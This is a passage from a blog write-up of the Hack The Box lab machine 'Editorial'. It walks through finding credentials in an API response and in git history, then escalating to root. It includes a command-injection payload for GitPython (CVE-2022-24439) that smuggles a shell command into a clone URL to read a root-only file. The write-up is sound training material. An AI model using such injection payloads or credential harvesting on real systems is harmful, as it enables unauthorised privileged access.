+<div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;messages&quot;:[&#123;&quot;promotions&quot;:&#123;&quot;description&quot;:&quot;Retrieve a list of all the promotions in our library.&quot;,&quot;endpoint&quot;:&quot;/api/latest/metadata/messages/promos&quot;,&quot;methods&quot;:&quot;GET&quot;&#125;&#125;,&#123;&quot;coupons&quot;:&#123;&quot;description&quot;:&quot;Retrieve the list of coupons to use in our library.&quot;,&quot;endpoint&quot;:&quot;/api/latest/metadata/messages/coupons&quot;,&quot;methods&quot;:&quot;GET&quot;&#125;&#125;,&#123;&quot;new_authors&quot;:&#123;&quot;description&quot;:&quot;Retrieve the welcome message sended to our new authors.&quot;,&quot;endpoint&quot;:&quot;/api/latest/metadata/messages/authors&quot;,&quot;methods&quot;:&quot;GET&quot;&#125;&#125;,&#123;&quot;platform_use&quot;:&#123;&quot;description&quot;:&quot;Retrieve examples of how to use the platform.&quot;,&quot;endpoint&quot;:&quot;/api/latest/metadata/messages/how_to_use_platform&quot;,&quot;methods&quot;:&quot;GET&quot;&#125;&#125;],&quot;version&quot;:[&#123;&quot;changelog&quot;:&#123;&quot;description&quot;:&quot;Retrieve a list of all the versions and updates of the api.&quot;,&quot;endpoint&quot;:&quot;/api/latest/metadata/changelog&quot;,&quot;methods&quot;:&quot;GET&quot;&#125;&#125;,&#123;&quot;latest&quot;:&#123;&quot;description&quot;:&quot;Retrieve the last version of api.&quot;,&quot;endpoint&quot;:&quot;/api/latest/metadata&quot;,&quot;methods&quot;:&quot;GET&quot;&#125;&#125;]&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>We can see that we have some API endpoints, we access <code>/api/latest/metadata/messages/authors</code> like we did preivously and we get some really amazing data:</p>
+<div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;template_mail_message&quot;</span><span class="punctuation">:</span><span class="string">&quot;Welcome to the team! We are thrilled to have you on board and can&#x27;t wait to see the incredible content you&#x27;ll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon&#x27;t hesitate to reach out if you have any questions or ideas - we&#x27;re always here to support you.\n\nBest regards, Editorial Tiempo Arriba Team.&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>We got ssh credentials! Let’s use those and get our user flag:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dev@editorial:~$ <span class="built_in">id</span></span><br><span class="line">uid=1001(dev) gid=1001(dev) <span class="built_in">groups</span>=1001(dev)</span><br><span class="line">dev@editorial:~$ <span class="built_in">cat</span> user.txt</span><br><span class="line">1b090a893289c3******************</span><br><span class="line">dev@editorial:~$</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Privilege-Escalation-to-root"><a href="#Privilege-Escalation-to-root" class="headerlink" title="Privilege Escalation to root"></a>Privilege Escalation to root</h3><p>We can see from our home directory that there’s another ‘prod’ user. We also have a “.git” directory on the “apps” directory on “dev”‘s home directory. So let’s try to check other git diffs for any other credentials:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">dev@editorial:~/apps/.git$ grep -r <span class="string">&quot;prod&quot;</span> .</span><br><span class="line">./logs/refs/heads/master:1e84a036b2f33c59e2390730699a488c65643d28 b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae dev-carlos.valderrama &lt;dev-carlos.valderrama@tiempoarriba.htb&gt; 1682906108 -0500      commit: change(api): downgrading prod to dev</span><br><span class="line">./logs/HEAD:1e84a036b2f33c59e2390730699a488c65643d28 b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae dev-carlos.valderrama &lt;dev-carlos.valderrama@tiempoarriba.htb&gt; 1682906108 -0500   commit: change(api): downgrading prod to dev</span><br><span class="line">dev@editorial:~/apps/.git$ git show 1e84a036b2f33c59e2390730699a488c65643d28</span><br><span class="line">commit 1e84a036b2f33c59e2390730699a488c65643d28</span><br><span class="line">Author: dev-carlos.valderrama &lt;dev-carlos.valderrama@tiempoarriba.htb&gt;</span><br><span class="line">Date:   Sun Apr 30 20:51:10 2023 -0500</span><br><span class="line"></span><br><span class="line">    feat: create api to editorial info</span><br><span class="line"></span><br><span class="line">    * It (will) contains internal info about the editorial, this <span class="built_in">enable</span></span><br><span class="line">       faster access to information.</span><br><span class="line"></span><br><span class="line">diff --git a/app_api/app.py b/app_api/app.py</span><br><span class="line">new file mode 100644</span><br><span class="line">index 0000000..61b786f</span><br><span class="line">--- /dev/null</span><br><span class="line">+++ b/app_api/app.py</span><br><span class="line">@@ -0,0 +1,74 @@</span><br><span class="line">+<span class="comment"># API (in development).</span></span><br><span class="line">+<span class="comment"># * To retrieve info about editorial</span></span><br><span class="line">+</span><br><span class="line">+import json</span><br><span class="line">+from flask import Flask, jsonify</span><br><span class="line">+</span><br><span class="line">+<span class="comment"># -------------------------------</span></span><br><span class="line">+<span class="comment"># App configuration</span></span><br><span class="line">+<span class="comment"># -------------------------------</span></span><br><span class="line">+app = Flask(__name__)</span><br><span class="line">+</span><br><span class="line">+<span class="comment"># -------------------------------</span></span><br><span class="line">+<span class="comment"># Global Variables</span></span><br><span class="line">+<span class="comment"># -------------------------------</span></span><br><span class="line">+api_route = <span class="string">&quot;/api/latest/metadata&quot;</span></span><br><span class="line">+api_editorial_name = <span class="string">&quot;Editorial Tiempo Arriba&quot;</span></span><br><span class="line">+api_editorial_email = <span class="string">&quot;info@tiempoarriba.htb&quot;</span></span><br><span class="line">+</span><br><span class="line">+<span class="comment"># -------------------------------</span></span><br><span class="line">+<span class="comment"># API routes</span></span><br><span class="line">+<span class="comment"># -------------------------------</span></span><br><span class="line">+<span class="comment"># -- : home</span></span><br><span class="line">+@app.route(<span class="string">&#x27;/api&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>])</span><br><span class="line">+def index():</span><br><span class="line">+    data_editorial = &#123;</span><br><span class="line">+        <span class="string">&#x27;version&#x27;</span>: [&#123;</span><br><span class="line">+            <span class="string">&#x27;1&#x27;</span>: &#123;</span><br><span class="line">+                <span class="string">&#x27;editorial&#x27;</span>: <span class="string">&#x27;Editorial El Tiempo Por Arriba&#x27;</span>,</span><br><span class="line">+                <span class="string">&#x27;contact_email_1&#x27;</span>: <span class="string">&#x27;soporte@tiempoarriba.oc&#x27;</span>,</span><br><span class="line">+                <span class="string">&#x27;contact_email_2&#x27;</span>: <span class="string">&#x27;info@tiempoarriba.oc&#x27;</span>,</span><br><span class="line">+                <span class="string">&#x27;api_route&#x27;</span>: <span class="string">&#x27;/api/v1/metadata/&#x27;</span></span><br><span class="line">+            &#125;&#125;,</span><br><span class="line">+            &#123;</span><br><span class="line">+            <span class="string">&#x27;1.1&#x27;</span>: &#123;</span><br><span class="line">+                <span class="string">&#x27;editorial&#x27;</span>: <span class="string">&#x27;Ed Tiempo Arriba&#x27;</span>,</span><br><span class="line">+                <span class="string">&#x27;contact_email_1&#x27;</span>: <span class="string">&#x27;soporte@tiempoarriba.oc&#x27;</span>,</span><br><span class="line">+                <span class="string">&#x27;contact_email_2&#x27;</span>: <span class="string">&#x27;info@tiempoarriba.oc&#x27;</span>,</span><br><span class="line">+                <span class="string">&#x27;api_route&#x27;</span>: <span class="string">&#x27;/api/v1.1/metadata/&#x27;</span></span><br><span class="line">+            &#125;&#125;,</span><br><span class="line">+            &#123;</span><br><span class="line">+            <span class="string">&#x27;1.2&#x27;</span>: &#123;</span><br><span class="line">+                <span class="string">&#x27;editorial&#x27;</span>: api_editorial_name,</span><br><span class="line">+                <span class="string">&#x27;contact_email_1&#x27;</span>: <span class="string">&#x27;soporte@tiempoarriba.oc&#x27;</span>,</span><br><span class="line">+                <span class="string">&#x27;contact_email_2&#x27;</span>: <span class="string">&#x27;info@tiempoarriba.oc&#x27;</span>,</span><br><span class="line">+                <span class="string">&#x27;api_route&#x27;</span>: f<span class="string">&#x27;/api/v1.2/metadata/&#x27;</span></span><br><span class="line">+            &#125;&#125;,</span><br><span class="line">+            &#123;</span><br><span class="line">+            <span class="string">&#x27;2&#x27;</span>: &#123;</span><br><span class="line">+                <span class="string">&#x27;editorial&#x27;</span>: api_editorial_name,</span><br><span class="line">+                <span class="string">&#x27;contact_email&#x27;</span>: <span class="string">&#x27;info@tiempoarriba.moc.oc&#x27;</span>,</span><br><span class="line">+                <span class="string">&#x27;api_route&#x27;</span>: f<span class="string">&#x27;/api/v2/metadata/&#x27;</span></span><br><span class="line">+            &#125;&#125;,</span><br><span class="line">+            &#123;</span><br><span class="line">+            <span class="string">&#x27;2.3&#x27;</span>: &#123;</span><br><span class="line">+                <span class="string">&#x27;editorial&#x27;</span>: api_editorial_name,</span><br><span class="line">+                <span class="string">&#x27;contact_email&#x27;</span>: api_editorial_email,</span><br><span class="line">+                <span class="string">&#x27;api_route&#x27;</span>: f<span class="string">&#x27;&#123;api_route&#125;/&#x27;</span></span><br><span class="line">+            &#125;</span><br><span class="line">+        &#125;]</span><br><span class="line">+    &#125;</span><br><span class="line">+    <span class="built_in">return</span> jsonify(data_editorial)</span><br><span class="line">+</span><br><span class="line">+<span class="comment"># -- : (development) mail message to new authors</span></span><br><span class="line">+@app.route(api_route + <span class="string">&#x27;/authors/message&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>])</span><br><span class="line">+def api_mail_new_authors():</span><br><span class="line">+    <span class="built_in">return</span> jsonify(&#123;</span><br><span class="line">+        <span class="string">&#x27;template_mail_message&#x27;</span>: <span class="string">&quot;Welcome to the team! We are thrilled to have you on board and can&#x27;t wait to see the incredible content you&#x27;ll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: prod\nPassword: 080217_Producti0n_2023!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon&#x27;t hesitate to reach out if you have any questions or ideas - we&#x27;re always here to support you.\n\nBest regards, &quot;</span> + api_editorial_name + <span class="string">&quot; Team.&quot;</span></span><br><span class="line">+    &#125;) <span class="comment"># <span class="doctag">TODO:</span> replace dev credentials when checks pass</span></span><br><span class="line">+</span><br><span class="line">+<span class="comment"># -------------------------------</span></span><br><span class="line">+<span class="comment"># Start program</span></span><br><span class="line">+<span class="comment"># -------------------------------</span></span><br><span class="line">+<span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">+    app.run(host=<span class="string">&#x27;127.0.0.1&#x27;</span>, port=5001, debug=True)</span><br><span class="line">dev@editorial:~/apps/.git$</span><br></pre></td></tr></table></figure></div>
+
+<p>Amazing! Now we have his password: “080217_Producti0n_2023!@”</p>
+<p>Let’s login using <code>prod</code> user and see what we can do by checking what we can run as sudo:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">prod@editorial:/home/dev/apps/.git$ sudo -l</span><br><span class="line">[sudo] password <span class="keyword">for</span> prod:</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> prod on editorial:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,</span><br><span class="line">    use_pty</span><br><span class="line"></span><br><span class="line">User prod may run the following commands on editorial:</span><br><span class="line">    (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *</span><br><span class="line">prod@editorial:/home/dev/apps/.git$ <span class="built_in">cat</span> /opt/internal_apps/clone_changes/clone_prod_change.py</span><br><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line">import os</span><br><span class="line">import sys</span><br><span class="line">from git import Repo</span><br><span class="line"></span><br><span class="line">os.chdir(<span class="string">&#x27;/opt/internal_apps/clone_changes&#x27;</span>)</span><br><span class="line"></span><br><span class="line">url_to_clone = sys.argv[1]</span><br><span class="line"></span><br><span class="line">r = Repo.init(<span class="string">&#x27;&#x27;</span>, bare=True)</span><br><span class="line">r.clone_from(url_to_clone, <span class="string">&#x27;new_changes&#x27;</span>, multi_options=[<span class="string">&quot;-c protocol.ext.allow=always&quot;</span>])</span><br><span class="line">prod@editorial:/home/dev/apps/.git$</span><br></pre></td></tr></table></figure></div>
+
+<p>We can see that we can run the above script as root.<br>Also checking this, we can see that GitPython is vulnerable to <a class="link"   target="_blank" rel="noopener" href="https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858" >CVE-2022-24439 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>.<br>So let’s get our root:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">prod@editorial:~$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py <span class="string">&#x27;ext::sh -c cat% /root/root.txt% &gt;% /tmp/root&#x27;</span></span><br><span class="line">prod@editorial:~$ <span class="built_in">cat</span> /tmp/root</span><br><span class="line">90a3d09d639e25******************</span><br></pre></td></tr></table></figure></div>
+<p>This will allow us to echo the contents of “&#x2F;root&#x2F;root.txt” file to a file of our choice. And that was it for <code>Editorial</code>.</p>
+<p>Hope you had fun!<br>-0xkujen</p>
+
+        </div>
+
+        
+            <div class="post-copyright-info px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> Hackthebox: Editorial</li>
+        <li><strong>Author:</strong> Foued SAIDI</li>
+        <li><strong>Created at
+                :</strong> 2024-10-19 02:44:22</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2024-10-19 22:23:00
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://kujen5.github.io/2024/10/19/Hackthebox-Editorial/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2024/10/10/Hackthebox-Blurry/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Hackthebox: Blurry</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">Hackthebox: Editorial</div>
+        <ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Overview"><span class="nav-text">Overview</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Reconnaissance"><span class="nav-text">Reconnaissance</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web-Application-http-editorial-htb"><span class="nav-text">Web Application - http:&#x2F;&#x2F;editorial.htb </span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Privilege-Escalation-to-root"><span class="nav-text">Privilege Escalation to root</span></a></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Foued SAIDI</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.2</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/libs/anime.min.js"></script>
+
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
